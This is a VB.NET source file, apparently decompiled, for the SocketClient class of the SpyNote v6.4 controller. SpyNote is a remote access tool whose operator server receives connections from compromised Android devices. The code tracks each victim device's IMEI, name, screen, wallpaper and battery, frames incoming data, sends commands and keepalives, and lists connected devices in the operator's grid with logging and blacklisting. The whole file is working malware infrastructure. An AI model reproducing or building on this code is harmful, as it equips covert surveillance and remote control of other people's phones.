Imports Microsoft.VisualBasic.CompilerServices
Imports System.IO
Imports System.Net
Imports System.Net.Sockets
Imports System.Runtime.CompilerServices
Imports System.Text
Imports System.Threading
Imports SpyNote_V6._4.SN.SpyNote.Stores
Imports SpyNote_V6._4.SN.Sockets.SpyNote.Server

Namespace SN.Sockets.SpyNote.Client
    Public Class SocketClient
        Public Socket As SocketServer

        Public Client As TcpClient

        Public ClientAddressIP As String

        Public ClientRemoteAddress As String

        Public IsClose As Boolean

        Public TimeOut As Boolean

        Public buffer As Byte()

        Public Rows As DataGridViewRow

        Public MemoryStream As MemoryStream

        Public Timers As System.Threading.Timer

        Public Maxsize As Long

        Public Flag As Bitmap

        Public Wallpaper As Bitmap

        Public NetworkStatus As Bitmap

        Public Battery As Bitmap

        Public Screen As Bitmap

        Public ClientImei As String

        Public ClientName As String

        Private SystemDateTime As DateTime

        Private Out_1 As DateTime

        Public wFileStream As FileStream

        Public TotalFileSize As Long

        Public FileSizeBytesDownloaded As Long

        Public elapsed_time As TimeSpan

        Public start_time As DateTime

        Public stop_time As DateTime

        Public Nickname As String

        Public gzip As Boolean

        Public SyncSend As Object

        Public Sub New(ParametersClient As TcpClient, ParametersSocket As SocketServer)
            Me.Maxsize = -1L
            Me.wFileStream = Nothing
            Me.Nickname = "-1"
            Me.gzip = True
            Me.SyncSend = RuntimeHelpers.GetObjectValue(New Object())
            Me.TimeOut = False
            Me.IsClose = False
            Try
                Me.SystemDateTime = DateTime.Now.AddSeconds(30.0)
                Me.Timers = New System.Threading.Timer(Sub(a0 As Object)
                                                           Me.SubTimers()
                                                       End Sub, Nothing, 500, 3000)
                Me.MemoryStream = New MemoryStream()
                Me.buffer = New Byte(0) {}
                Me.Client = ParametersClient
                Me.Socket = ParametersSocket
                Me.ClientRemoteAddress = (CType(Me.Client.Client.RemoteEndPoint, IPEndPoint)).ToString()
                Me.ClientAddressIP = (CType(Me.Client.Client.RemoteEndPoint, IPEndPoint)).Address.ToString()
                Me.Client.Client.BeginReceive(Me.buffer, 0, Me.buffer.Length, SocketFlags.None, AddressOf Me.DataRecieved, Nothing)
            Catch expr_120 As Exception
                Dim flag As Boolean = Not Me.IsClose
                If flag Then
                    Me.Close(False)
                End If
            End Try
        End Sub

        Public Sub Send(ParametersString As String)
            Try
                Dim syncSend As Object = Me.SyncSend
                ObjectFlowControl.CheckForSyncLockOnValueType(syncSend)
                SyncLock syncSend
                    Dim text As String = ParametersString + Data.SplitData
                    ThreadPool.QueueUserWorkItem(Sub(a0 As Object)
                                                     Me.SendToClient(CType(a0, Byte()))
                                                 End Sub, Store.Encoding().GetBytes(Conversions.ToString(text.Length) + vbNullChar + text))
                    Thread.Sleep(10)
                End SyncLock
            Catch expr_73 As Exception
            End Try
        End Sub

        Public Sub SendToClient(ParametersByte As Byte())
            Try
                Dim syncSend As Object = Me.SyncSend
                ObjectFlowControl.CheckForSyncLockOnValueType(syncSend)
                SyncLock syncSend
                    Me.Client.Client.SendBufferSize = ParametersByte.Length
                    Try
                        Data.BytesSent += CLng(Me.buffer.Length)
                        Me.Client.Client.Send(ParametersByte, 0, ParametersByte.Length, SocketFlags.None)
                    Catch expr_5E As SocketException
                        Dim flag2 As Boolean = Not Me.IsClose
                        If flag2 Then
                            Me.Close(False)
                        End If

                    End Try
                End SyncLock
            Catch expr_94 As Exception
                Dim flag3 As Boolean = Not Me.IsClose
                If flag3 Then
                    Me.Close(False)
                End If

            End Try
        End Sub

        Private Sub SubTimers()
            Try
                Dim flag As Boolean = Not Me.IsClose
                If flag Then
                    Dim flag2 As Boolean = Data.SpyNote.BlackList.Contains(Me.ClientAddressIP)
                    If flag2 Then
                        Me.Close(True)
                        Data.LogsSpyNote(New String() {Me.ClientAddressIP, Me.ClientRemoteAddress, "Disconnect", "Block", Nothing, "To Blacklist"})
                        Dim flag3 As Boolean = Not Data.SpyNote.BlackList.Contains(Me.ClientAddressIP)
                        If flag3 Then
                            Data.SpyNote.BlackList.Add(Me.ClientAddressIP)
                        End If
                    Else
                        Dim flag4 As Boolean = Not Me.TimeOut
                        If flag4 Then
                            Dim now As DateTime = DateTime.Now
                            Dim num As Integer = DateTime.Compare(Me.SystemDateTime, now)
                            Dim flag5 As Boolean = num = -1
                            If flag5 Then
                                Me.Close(True)
                                Data.LogsSpyNote(New String() {Me.ClientAddressIP, Me.ClientRemoteAddress, "Disconnect", "TimeOut", Nothing, "TimeOut"})
                            End If
                        Else
                            Dim now2 As DateTime = DateTime.Now
                            Dim num2 As Integer = DateTime.Compare(Me.Out_1, now2)
                            Dim flag6 As Boolean = num2 = -1
                            If flag6 Then
                                Me.SendToClient(Store.Encoding().GetBytes(Conversions.ToString("poing".Length) + vbNullChar & "poing"))
                                Me.Out_1 = DateTime.Now.AddSeconds(45.0)
                            End If
                        End If
                    End If
                End If
            Catch expr_187 As Exception
            End Try
        End Sub

        Public Sub DataRecieved(ar As IAsyncResult)
            Try
                Dim flag As Boolean = ar Is Nothing
                If flag Then
                    Dim flag2 As Boolean = Not Me.IsClose
                    If flag2 Then
                        Me.Close(False)
                    End If
                Else
                    Dim num As Integer = 0
                    Try
                        Dim flag3 As Boolean = Not Me.IsClose
                        If Not flag3 Then
                            GoTo IL_33B
                        End If
                        Dim connected As Boolean = Me.Client.Client.Connected
                        If Not connected Then
                            Dim flag4 As Boolean = Not Me.IsClose
                            If flag4 Then
                                Me.Close(False)
                            End If
                            GoTo IL_33B
                        End If
                        num = Me.Client.Client.EndReceive(ar)
                    Catch expr_88 As SocketException
                        ProjectData.SetProjectError(expr_88)
                        Dim flag5 As Boolean = Not Me.IsClose
                        If flag5 Then
                            Me.Close(False)
                        End If
                        ProjectData.ClearProjectError()
                        GoTo IL_33B
                    End Try
                    Dim flag6 As Boolean = num > 0
                    If flag6 Then
                        Data.BytesReceived += CLng(num)
                        Dim flag7 As Boolean = Me.Maxsize = -1L
                        If flag7 Then
                            Dim flag8 As Boolean = Me.buffer(0) = 0
                            If flag8 Then
                                Dim text As String = Store.Encoding().GetString(Me.MemoryStream.ToArray()).Trim()
                                Me.Maxsize = Conversions.ToLong(If(Versioned.IsNumeric(text), text, -1))
                                Dim maxsize As Long = Me.Maxsize
                                Me.Client.Client.ReceiveBufferSize = CInt(maxsize)
                                Me.buffer = New Byte(CInt((Me.Maxsize - 1L)) + 1 - 1 + 1 - 1) {}
                                Me.MemoryStream.Dispose()
                                Me.MemoryStream = New MemoryStream()
                            Else
                                Me.MemoryStream.WriteByte(Me.buffer(0))
                            End If
                        Else
                            Me.MemoryStream.Write(Me.buffer, 0, num)
                            Dim flag9 As Boolean = CLng(Me.MemoryStream.ToArray().Length) = Me.Maxsize
                            If flag9 Then
                                Dim passData As PassData = New PassData(Me, Me.MemoryStream.ToArray())
                                Dim requestData As List(Of PassData) = Me.Socket.RequestData
                                Dim obj As Object = requestData
                                SyncLock obj
                                    Me.Socket.RequestData.Add(passData)
                                End SyncLock
                                While Not passData.wait
                                    Thread.Sleep(1)
                                End While
                                Me.MemoryStream.Dispose()
                                Me.MemoryStream = New MemoryStream()
                                Me.Maxsize = -1L
                                Me.buffer = New Byte(0) {}
                            Else
                                Me.buffer = New Byte(CInt((Me.Maxsize - Me.MemoryStream.Length - 1L)) + 1 - 1 + 1 - 1) {}
                            End If
                        End If
                        Try
                            Dim flag11 As Boolean = Not Me.IsClose
                            If flag11 Then
                                Dim connected2 As Boolean = Me.Client.Client.Connected
                                If connected2 Then
                                    Me.Client.Client.BeginReceive(Me.buffer, 0, Me.buffer.Length, SocketFlags.None, AddressOf Me.DataRecieved, Nothing)
                                Else
                                    Dim flag12 As Boolean = Not Me.IsClose
                                    If flag12 Then
                                        Me.Close(False)
                                    End If
                                End If
                            End If
                        Catch expr_311 As SocketException
                            Dim flag13 As Boolean = Not Me.IsClose
                            If flag13 Then
                                Me.Close(False)
                            End If

                        End Try
                    End If
                End If
IL_33B:
            Catch expr_33E As Exception
            End Try
        End Sub

        Public Sub Close(ParametersBoolean As Boolean)
            Try
                Me.IsClose = True
                Try
                    Dim flag As Boolean = Me.wFileStream IsNot Nothing
                    If flag Then
                        Me.wFileStream.Close()
                        Me.wFileStream.Dispose()
                    End If
                Catch expr_33 As Exception
                End Try
                Try
                    Me.Timers.Dispose()
                Catch expr_52 As Exception
                End Try
                Try
                    Me.MemoryStream.Dispose()
                Catch expr_71 As Exception
                End Try
                Try
                    Dim connected As Boolean = Me.Client.Connected
                    If connected Then
                        Me.Client.GetStream().Close()
                    End If
                Catch expr_A9 As Exception
                End Try
                Try
                    Me.Client.Client.Close()
                Catch expr_CE As Exception
                End Try
                Dim clientsOnline As Collection = Me.Socket.ClientsOnline
                Dim obj As Object = clientsOnline
                SyncLock obj
                    Dim flag3 As Boolean = Me.Socket.ClientsOnline.Contains(Me.ClientRemoteAddress)
                    If flag3 Then
                        Me.Socket.ClientsOnline.Remove(Me.ClientRemoteAddress)
                    End If
                End SyncLock
                Dim flag4 As Boolean = Me.Rows IsNot Nothing
                If flag4 Then
                    Dim flag5 As Boolean = Me.Rows.Index > -1
                    If flag5 Then
                        Dim collection_ As Collection = Data.SpyNote.Collection_0
                        Dim obj2 As Object = collection_
                        SyncLock obj2
                            Dim flag7 As Boolean = Me.Rows IsNot Nothing
                            If flag7 Then
                                Data.SpyNote.DataGridView1.Rows(Me.Rows.Index).Cells(0).Tag = "-"
                                Data.SpyNote.DataGridView1.Rows(Me.Rows.Index).DefaultCellStyle.BackColor = Color.FromArgb(27, 27, 28)
                                Me.Rows = Nothing
                            End If
                        End SyncLock
                    End If
                End If
                Dim flag8 As Boolean = Not ParametersBoolean
                If flag8 Then
                    Data.LogsSpyNote(New String() {Me.ClientAddressIP, Me.ClientRemoteAddress, "Disconnect", "Disconnect", Nothing, "Away"})
                End If
            Catch expr_264 As Exception
            End Try
        End Sub

        Public Function mProgressBar(progId0 As String, progId1 As String) As Integer
            Dim flag As Boolean = Me.Maxsize = -1L
            Dim result As Integer
            If flag Then
                result = 0
            Else
                Try
                    Dim arg_2E_0 As Encoding = Store.Encoding()
                    Dim array As Byte() = Me.MemoryStream.ToArray()
                    Dim text As String = arg_2E_0.GetString(Store.Decompress(array)).Trim()
                    Dim flag2 As Boolean = text.StartsWith(progId0) Or text.StartsWith(progId1)
                    If flag2 Then
                        Dim num As Integer = Store.RateConverter(CInt(Me.MemoryStream.Length), CInt(Me.Maxsize))
                        result = num
                    Else
                        result = 0
                    End If
                Catch expr_70 As Exception
                    result = 0
                End Try
            End If
            Return result
        End Function
        Private Sub Lam_1291(a0 As Object)
            Me.SubTimers()
        End Sub

        Private Sub Lam_1302(a0 As Object)
            Me.SendToClient(CType(a0, Byte()))
        End Sub
    End Class
End Namespace
